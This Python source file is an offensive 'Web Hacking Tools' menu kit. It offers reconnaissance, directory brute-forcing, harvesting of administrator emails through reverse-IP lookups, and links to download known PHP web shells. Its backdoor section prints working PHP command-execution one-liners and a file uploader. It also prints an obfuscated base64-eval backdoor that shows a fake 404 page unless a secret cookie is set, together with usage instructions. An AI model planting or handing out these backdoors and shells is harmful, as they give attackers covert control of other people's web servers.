#!/usr/bin/env python3
# -*- coding: UTF-8 -*-

# --== Coded by MR-KaBuD ==--
# - [ Web Hacking Tools ] -
# Version : 1.0

import sys, os, time
from modules import info , payloads , serv_vuln

try:
        import requests
        import builtwith
        import whois
        from bs4 import BeautifulSoup
except:
        print(color.RED+"[*] Install requests & builtwith & whois for do it")
        print("=> pip install requests")
        print("=> pip install builtwith")
        print("=> pip install whois")
        sys.exit()

def clean():
        os.system('cls' or 'clear')

class color : 
    GREEN = '\033[92m'
    RED = '\033[31m'
    WHITE = '\033[37m'
    YELLOW = '\033[33m'
    BLUE = '\033[94m'


def banner():
        clean()
        print(color.YELLOW+"""\n
 __ v.1      __  _       _    _            _    _               _______          _ 
 \ \        / / | |     | |  | |          | |  (_)             |__   __|        | |
  \ \  /\  / /__| |__   | |__| | __ _  ___| | ___ _ __   __ _     | | ___   ___ | |
   \ \/  \/ / _ \ '_ \  |  __  |/ _` |/ __| |/ / | '_ \ / _` |    | |/ _ \ / _ \| |
    \  /\  /  __/ |_) | | |  | | (_| | (__|   <| | | | | (_| |    | | (_) | (_) | |
     \/  \/ \___|_.__/  |_|  |_|\__,_|\___|_|\_\_|_| |_|\__, |    |_|\___/ \___/|_|
                                                         __/ |                     
                  """+color.WHITE+"""[~] Author : github.com/MR-KaBuD"""+color.YELLOW+"""      |___/                      
        """)

def menu():
        print("""
        """+color.YELLOW+"""["""+color.WHITE+"""1"""+color.YELLOW+"""]"""+color.GREEN+""" Information Gathering
        """+color.YELLOW+"""["""+color.WHITE+"""2"""+color.YELLOW+"""]"""+color.GREEN+""" Admin | Dir   Finder
        """+color.YELLOW+"""["""+color.WHITE+"""3"""+color.YELLOW+"""]"""+color.GREEN+""" Reverse IP
        """+color.YELLOW+"""["""+color.WHITE+"""4"""+color.YELLOW+"""]"""+color.GREEN+""" Admin-Email Grabber by server IP
        """+color.YELLOW+"""["""+color.WHITE+"""5"""+color.YELLOW+"""]"""+color.GREEN+""" Find Vuln on server
        """+color.YELLOW+"""["""+color.WHITE+"""6"""+color.YELLOW+"""]"""+color.GREEN+""" Payload For Vulns
        """+color.YELLOW+"""["""+color.WHITE+"""7"""+color.YELLOW+"""]"""+color.GREEN+""" Web Shells
        """+color.YELLOW+"""["""+color.WHITE+"""8"""+color.YELLOW+"""]"""+color.GREEN+""" BackDoor Generator
        """+color.YELLOW+"""["""+color.WHITE+"""9"""+color.YELLOW+"""]"""+color.GREEN+""" WP bruter
        """+color.YELLOW+"""["""+color.WHITE+"""10"""+color.YELLOW+"""]"""+color.GREEN+""" Admin Bypasser
        """+color.YELLOW+"""["""+color.WHITE+"""11"""+color.YELLOW+"""]"""+color.GREEN+""" Login Brute Force
        """+color.YELLOW+"""["""+color.WHITE+"""99"""+color.YELLOW+"""]"""+color.GREEN+""" exit
        """)
        choose = input("        "+color.RED+"["+color.WHITE+"?"+color.RED+"]"+color.BLUE+" choose an option "+color.YELLOW+"# "+color.WHITE+"──╼ >> : ")
        if choose == "1":
                inform()
        elif choose == "2":
                finder()
        elif choose == "3":
                reverse()
        elif choose == "4":
                admin_mail()
        elif choose == "5":
                server_vuln()
        elif choose == "6":
                payload()
        elif choose == "7":
                shells()
        elif choose == "8":
                backdoor()
        elif choose == "9":
                wp()
        elif choose == "10":
                bypass()
        elif choose == "11":
                loginbrute()
        
        elif choose == '99':
                sys.exit()
        else:
                print(color.RED+"\n        [-] choose a number option !!")
                time.sleep(3)
                banner()
                menu()



# options :

def inform():
        banner()

        print(color.RED+"\n        [#] Information Gathering !! [#]")
        print("""
        """+color.YELLOW+"""["""+color.WHITE+"""1"""+color.YELLOW+"""]"""+color.GREEN+""" whois
        """+color.YELLOW+"""["""+color.WHITE+"""2"""+color.YELLOW+"""]"""+color.GREEN+""" port scan
        """+color.YELLOW+"""["""+color.WHITE+"""3"""+color.YELLOW+"""]"""+color.GREEN+""" whats run
        """+color.YELLOW+"""["""+color.WHITE+"""4"""+color.YELLOW+"""]"""+color.GREEN+""" get host ip
        """+color.YELLOW+"""["""+color.WHITE+"""5"""+color.YELLOW+"""]"""+color.GREEN+""" subdomain lister
        """+color.YELLOW+"""["""+color.WHITE+"""6"""+color.YELLOW+"""]"""+color.GREEN+""" DNS Lookup
        """+color.YELLOW+"""["""+color.WHITE+"""99"""+color.YELLOW+"""]"""+color.GREEN+""" exit
        """)
        choose_info = input("        "+color.RED+"["+color.WHITE+"?"+color.RED+"]"+color.BLUE+" choose an option "+color.YELLOW+"# "+color.WHITE+"──╼ >> : ")

        if choose_info == '1':
                info.whois()
        elif choose_info == '2':
                info.ports()
        elif choose_info == '3':
                info.whatsrun()
        elif choose_info == '4':
                info.gethost()
        elif choose_info == '5':
                info.subdom()
        elif choose_info == '6':
                info.dnslook()
        elif choose_info == '99':
                sys.exit()
        
        else:
                print(color.RED+"\n        [-] choose a number option !!")
                time.sleep(3)
                inform()


def finder():
        banner()
        print(color.RED+"\n        [#] Admin | Directory  Finder !! [#]\n")

        url = input(color.BLUE+"        [?] Enter The URL # ──╼ >> : ")
        url.split("http://")
        url.split("https://")
        url.split("www.")

        url = "http://"+url

        try:

                if url.endswith("/"):
                        url = url[:-1]

                wordlist = "files/dirs.txt"
                correct_words = []
                print()
                for word in open(wordlist):
                        word = word.strip("\n")
                        address = url + "/" + word
                        
                        response = requests.get(address).status_code
                        if response == 200:
                                print(color.GREEN + "        [+] "+address+" > exists")
                                correct_words.append(word)
                        else:
                                print(color.RED + "        [-] {}  > not exists".format(word))


                print(color.YELLOW+"       -------------------------")
                print(color.GREEN+"        [+] Found Words : ")
                for word in correct_words:
                        print(color.BLUE+"         - " + word)

                input(color.GREEN+"\n        [~] Enter for Back To Menu : ")
                banner()
                menu()
        except:
                print(color.RED+"\n        [!] Error !! , Check your Internet Connection or false input ...")
                time.sleep(3)
                banner()
                menu()


def reverse():
        banner()
        print(color.RED+"\n        [#] Reverse IP !! [#]\n")

        url = input(color.BLUE+"        [?] Enter The IP / URL # ──╼ >> : ")

        try:
                result = requests.get('https://api.hackertarget.com/reverseiplookup/?q=' + url).text
                print(color.WHITE+"\n"+result)
                input(color.GREEN+"\n        [~] Enter for Back To Menu : ")
                banner()
                menu()

        except:
                print(color.RED+"\n        [!] Error !! , Check your Internet Connection or false input ...")
                time.sleep(3)
                banner()
                menu()


def admin_mail():
        banner()
        print(color.RED+"\n        [#] Server Admin Emails Grabber !! [#]\n")

        url = input(color.BLUE+"        [?] Enter The IP / URL # ──╼ >> : ")

        try:
                result = requests.get('https://api.hackertarget.com/reverseiplookup/?q=' + url).text
                domains = result.split("\n")
                # print(domains)

                for i in domains:
                        fin = whois.whois(i)["emails"]
                        print(fin)
                        # for j in fin:
                        #         print(color.YELLOW+"        "+j)
                
                input(color.GREEN+"\n        [~] Enter for Back To Menu : ")
                banner()
                menu()

        except:
                print(color.RED+"\n        [!] Error !! , Check your Internet Connection or false input ...")
                time.sleep(3)
                banner()
                menu()

        

def server_vuln():
        banner()
        print(color.RED+"\n        [#] Login Page Brute Force !! [#]\n")

        print(color.YELLOW+"        [~] Soon ...")

def payload():
        banner()

        print(color.RED+"\n        [#] Payloads for vulnerability !! [#]")
        print("""
        """+color.YELLOW+"""["""+color.WHITE+"""1"""+color.YELLOW+"""]"""+color.GREEN+""" XSS
        """+color.YELLOW+"""["""+color.WHITE+"""2"""+color.YELLOW+"""]"""+color.GREEN+""" SQL Injection
        """+color.YELLOW+"""["""+color.WHITE+"""3"""+color.YELLOW+"""]"""+color.GREEN+""" OPEN Redirect
        """+color.YELLOW+"""["""+color.WHITE+"""4"""+color.YELLOW+"""]"""+color.GREEN+""" RFI / LFI
        """+color.YELLOW+"""["""+color.WHITE+"""5"""+color.YELLOW+"""]"""+color.GREEN+""" RCE
        """+color.YELLOW+"""["""+color.WHITE+"""6"""+color.YELLOW+"""]"""+color.GREEN+""" CSRF
        """+color.YELLOW+"""["""+color.WHITE+"""99"""+color.YELLOW+"""]"""+color.GREEN+""" exit
        """)
        choose_payload = input("        "+color.RED+"["+color.WHITE+"?"+color.RED+"]"+color.BLUE+" choose an option "+color.YELLOW+"# "+color.WHITE+"──╼ >> : ")

        if choose_payload == '1':
                payloads.xss()
        elif choose_payload == '2':
                payloads.sqli()
        elif choose_payload == '3':
                payloads.openredir()
        elif choose_payload == '4':
                payloads.rl_fi()
        elif choose_payload == '5':
                payloads.rce()
        elif choose_payload == '6':
                payloads.csrf()
        elif choose_payload == '99':
                sys.exit()
        
        else:
                print(color.RED+"\n        [-] choose a number option !!")
                time.sleep(3)
                payload()
        
def shells():
        banner()
        print(color.RED+"\n        [#] Web Shell Url !! [#]\n")

        print(color.BLUE+"""

        """+color.WHITE+""" [#] Alfa Sell :"""+color.BLUE+"""
                https://www.localroot.net/shell-alfa.txt

        """+color.WHITE+""" [#] C99 :"""+color.BLUE+"""
                https://www.localroot.net/shell-c99-php7.txt
                https://www.localroot.net/shell-c99o.txt

        """+color.WHITE+""" [#] R57 :"""+color.BLUE+"""
                https://www.localroot.net/shell-r57.txt
                https://www.localroot.net/shell-r57bypass.txt
                
        """+color.WHITE+""" [#] mini-Shell :"""+color.BLUE+"""
                https://www.localroot.net/shell-mini.txt
                
        """+color.WHITE+""" [#] wso :"""+color.BLUE+"""
                https://www.localroot.net/shell-wso-php7.txt
                https://www.localroot.net/shell-wso.txt
                
        """+color.WHITE+""" [#] B374K :"""+color.BLUE+"""
                https://www.localroot.net/shell-b374k.txt
                
        """+color.WHITE+""" [#] Ashiyane Shell :"""+color.BLUE+"""
                https://www.localroot.net/shell-ashiyane.txt
                
        """+color.WHITE+""" [#] WebRoot Shell :"""+color.BLUE+"""
                https://www.localroot.net/shell-webroot.txt
        
        """+color.WHITE+""" [#] aspx Shell :"""+color.BLUE+"""
                https://www.localroot.net/shell-aspx.txt

        """+color.WHITE+""" [#] Symlink Shell :"""+color.BLUE+"""
                https://www.localroot.net/shell-symlinkv3.txt
        
        """)

        input(color.GREEN+"\n        [~] Enter for Back To Menu : ")
        banner()
        menu()

def backdoor():
        banner()
        print(color.RED+"\n        [#] BackDoor Generator !! [#]\n")

        print(color.BLUE+"""

        """+color.WHITE+""" [#] Simple BackDoor :"""+color.BLUE+"""
                <?php system($_GET['cmd']); ?>
                <?php echo shell_exec($_GET['cmd']); ?>
                <?php echo passthru($_GET['cmd']); ?>
        

        """+color.WHITE+""" [#] Uploader BackDoor :"""+color.BLUE+"""
                <?php if($_POST['_upl'] == 'upload'){if(@copy($_FILES['file']['tmp_name'], $_FILES['file']['name'])) {echo '<b>Uploaded !!!</b> <a href='.$_FILES['file']['name'].'> - Click 2 Go - </a><br><br>';}}?><html><form action='' method='POST' enctype='multipart/form-data' name='uploader' id='uploader'><input type='file' name='file'><input name='_upl' type='submit' id='_upl' value='upload'></form></html>


        """+color.WHITE+""" [#] Priv8 BackDoor for Bypass Disabled functions :"""+color.BLUE+"""
                $kabud="\x62\141\x73\x65\x36\x34\x5f\x64\x65\x63\157\x64\x65";@eval($kabud("DQppZihpc3NldCgkX0NPT0tJRVsia2FidWQiXSkgJiYgJF9DT09LSUVbImthYnVkIl09PSJsb2FkIil7DQogICAgICAgIGlmKGlzc2V0KCRfR0VUWyJrIl0pKXsNCiAgICAgICAgICAgICAgICBlY2hvICI8cHJlPiIuIHNoZWxsX2V4ZWMoJF9HRVRbImsiXSkuICI8L3ByZT4iOw0KICAgICAgICB9DQp9DQplbHNlew0KICAgICAgICBkaWUoIjx0aXRsZT40MDQgTm90IEZvdW5kPC90aXRsZT48aDE+Tm90IEZvdW5kPC9oMT4gDQogICAgICAgIDxwPlRoZSByZXF1ZXN0ZWQgVVJMIHdhcyBub3QgZm91bmQgb24gdGhpcyBzZXJ2ZXIuPC9wPiANCiAgICAgICAgPHA+QWRkaXRpb25hbGx5LCBhIDQwNCBOb3QgRm91bmQgZXJyb3Igd2FzIGVuY291bnRlcmVkIHdoaWxlIHRyeWluZyB0byB1c2UgYW4gRXJyb3JEb2N1bWVudCB0byBoYW5kbGUgdGhlIHJlcXVlc3QuPC9wPiANCiAgICAgICAgPGhyPiANCiAgICAgICAgPGFkZHJlc3M+QXBhY2hlLzIuMi4yMiAoVW5peCkgbW9kX3NzbC8yLjIuMjIgT3BlblNTTC8xLjAuMC1maXBzIG1vZF9hdXRoX3Bhc3N0aHJvdWdoLzIuMSBtb2RfYndsaW1pdGVkLzEuNCBGcm9udFBhZ2UvNS4wLjIuMjYzNSBTZXJ2ZXIgYXQgUG9ydCA4MDwvYWRkcmVzcz4gDQogICAgICAgICIpOyANCn0NCg=="));

                use : target.com/shell.php?k=<cmd>
                set cookie : kabud=load
        """)

        input(color.GREEN+"\n        [~] Enter for Back To Menu : ")
        banner()
        menu()


def wp():
        banner()
        print(color.RED+"\n        [#] Login Page Brute Force !! [#]\n")

        print(color.YELLOW+"        [~] Soon ...")

def bypass():
        banner()
        print(color.RED+"\n        [#] Login Page ByPass Sqli method !! [#]\n")

        print(color.YELLOW+"        [~] Soon ...")


def loginbrute():
        banner()
        print(color.RED+"\n        [#] Login Page Brute Force !! [#]\n")

        print(color.YELLOW+"        [~] Soon ...")


banner()
menu()